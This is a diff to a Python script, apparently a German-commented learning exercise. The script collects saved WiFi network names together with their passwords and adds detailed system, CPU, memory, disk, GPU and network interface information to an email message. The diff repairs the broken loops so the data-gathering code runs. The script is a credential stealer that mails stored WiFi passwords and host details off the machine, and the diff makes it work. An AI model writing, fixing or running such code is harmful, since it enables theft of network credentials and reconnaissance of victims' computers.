@@ -7,6 +7,16 @@ import platform
 from datetime import datetime
 from email.message import EmailMessage
 
+
+def adjust_size(size):
+    factor = 1024
+    for i in ["B", "KB", "MB", "GB", "TB"]:
+        if size > factor:
+            size = size / factor
+        else:
+            return f"{size:.3f}{i}"
+
+
 # In Python können wir Systembefehle ausführen, indem wir eine Funktion verwenden, die vom Modul subprocess bereitgestellt wird (subprocess.run(<Liste der Befehlszeilenargumente geht hierhin>, <Angabe des zweiten Arguments, wenn Sie die Ausgabe aufzeichnen möchten>))
 
 # Das Skript ist ein übergeordneter Prozess und erzeugt einen untergeordneten Prozess, der den Systembefehl ausführt und erst weiterläuft, wenn der untergeordnete Prozess beendet ist.
@@ -61,27 +71,80 @@ net_io = psutil.net_io_counters()
 disk_io = psutil.disk_io_counters()
 bt = datetime.fromtimestamp(boot_time_timestamp)
 partitions = psutil.disk_partitions()
-for interface_name, interface_addresses in if_addrs.items():
-    for address in interface_addresses:
-        # Hier muss ein Befehl rein - sonst ist das ein syntax error!
-for p in partitions:
-    try:
-        partition_usage = psutil.disk_usage(p.mountpoint)
-    except PermissionError:
-        continue
-def adjust_size(size):
-    factor = 1024
-    for i in ["B", "KB", "MB", "GB", "TB"]:
-        if size > factor:
-            size = size / factor
-        else:
-            return f"{size:.3f}{i}"
 
 # Erstellen Sie die Nachricht für die E-Mail
 email_message = "Hier die Daten:"
 for item in wifi_list:
     email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
-    email_message += f" System: {uname.system}\n Node Name: {uname.node}\n Release: {uname.release}\n Version: {uname.version}\n Machine: {uname.machine}\n Processor: {uname.processor}\n Boot Time: {bt.day}.{bt.month}.{bt.year} {bt.hour}:{bt.minute}:{bt.second}\n Actual Cores: {psutil.cpu_count(logical=False)}\n Logical Cores: {psutil.cpu_count(logical=True)}\n Max Frequency: {psutil.cpu_freq().max:.1f}Mhz\n Current Frequency: {psutil.cpu_freq().current:.1f}Mhz\n CPU Usage: {psutil.cpu_percent()}%\n CPU Usage/Core: \n Total: {adjust_size(virtual_mem.total)}\n Available: {adjust_size(virtual_mem.available)}\n Used: {adjust_size(virtual_mem.used)}\n Percentage: {virtual_mem.percent}%\n Total: {adjust_size(swap.total)}\n Free: {adjust_size(swap.free)}\n Used: {adjust_size(swap.used)}\n Percentage: {swap.percent}%\n Read since boot: {adjust_size(disk_io.read_bytes)}\n Written since boot: {adjust_size(disk_io.write_bytes)}\n ID: {gpus.id}, Name: {gpus.name}\n Load: {gpus.load*100}%\n Free Mem: {gpus.memoryFree}MB\n Used Mem: {gpus.memoryUsed}MB\n Total Mem: {gpus.memoryTotal}MB\n Temperature: {gpus.temperature} °C\n Interface: {interface_name}\n IP Address: {address.address}\n Netmask: {address.netmask}\n Broadcast IP: {address.broadcast}\n MAC Address: {address.address}\n Netmask: {address.netmask}\n Broadcast MAC: {address.broadcast}\n Total Bytes Sent: {adjust_size(net_io.bytes_sent)}\n Total Bytes Received: {adjust_size(net_io.bytes_recv)}\n Device: {p.device}\n Mountpoint: {p.mountpoint}\n File system type: {p.fstype}\n Total Size: {adjust_size(partition_usage.total)}\n Used: {adjust_size(partition_usage.used)}\n Free: {adjust_size(partition_usage.free)}\n Percentage: {partition_usage.percent}%\n"
+    email_message += (
+        f"System: {uname.system}\n" 
+        f"Node Name: {uname.node}\n" 
+        f"Release: {uname.release}\n" 
+        f"Version: {uname.version}\n" 
+        f"Machine: {uname.machine}\n" 
+        f"Processor: {uname.processor}\n" 
+        f"Boot Time: {bt.day}.{bt.month}.{bt.year} {bt.hour}:{bt.minute}:{bt.second}\n" 
+        f"Actual Cores: {psutil.cpu_count(logical=False)}\n" 
+        f"Logical Cores: {psutil.cpu_count(logical=True)}\n " 
+        f"Max Frequency: {psutil.cpu_freq().max:.1f}Mhz\n" 
+        f"Current Frequency: {psutil.cpu_freq().current:.1f}Mhz\n" 
+        f"CPU Usage: {psutil.cpu_percent()}%\n" 
+        f"CPU Usage/Core: \n Total: {adjust_size(virtual_mem.total)}\n"
+        f"Available: {adjust_size(virtual_mem.available)}\n" 
+        f"Used: {adjust_size(virtual_mem.used)}\n"
+        f"Percentage: {virtual_mem.percent}%\n" 
+        f"Total: {adjust_size(swap.total)}\n" 
+        f"Free: {adjust_size(swap.free)}\n" 
+        f"Used: {adjust_size(swap.used)}\n" 
+        f"Percentage: {swap.percent}%\n"
+    )
+
+for p in partitions:
+    try:
+        partition_usage = psutil.disk_usage(p.mountpoint)
+    except PermissionError:
+        continue
+    email_message += (
+        f"Device: {p.device}\n"
+        f"Mountpoint: {p.mountpoint}\n"
+        f"File system type: {p.fstype}\n"
+        f"Total Size: {adjust_size(partition_usage.total)}\n"
+        f"Used: {adjust_size(partition_usage.used)}\n"
+        f"Free: {adjust_size(partition_usage.free)}\n"
+        f"Percentage: {partition_usage.percent}%\n"
+    )
+
+email_message += (
+    f"Read since boot: {adjust_size(disk_io.read_bytes)}\n" 
+    f"Written since boot: {adjust_size(disk_io.write_bytes)}\n"
+)
+
+for gpu in gpus:
+    email_message += (
+        f"ID: {gpu.id}, Name: {gpu.name}\n"
+        f"Load: {gpu.load * 100}%\n"
+        f"Free Mem: {gpu.memoryFree}MB\n"
+        f"Used Mem: {gpu.memoryUsed}MB\n"
+        f"Total Mem: {gpu.memoryTotal}MB\n"
+        f"Temperature: {gpu.temperature} °C\n"
+    )
+
+for interface_name, interface_addresses in if_addrs.items():
+    email_message += f"Interface: {interface_name}\n"
+    for address in interface_addresses:
+        email_message += (
+            f"IP Address: {address.address}\n"
+            f"Netmask: {address.netmask}\n"
+            f"Broadcast IP: {address.broadcast}\n"
+            f"MAC Address: {address.address}\n"
+            f"Netmask: {address.netmask}\n"
+            f"Broadcast MAC: {address.broadcast}\n"
+        )
+
+email_message += (
+    f"Total Bytes Sent: {adjust_size(net_io.bytes_sent)}\n" 
+    f"Total Bytes Received: {adjust_size(net_io.bytes_recv)}\n"
+)
 
 # EmailMessage-Objekt erstellen
 email = EmailMessage()
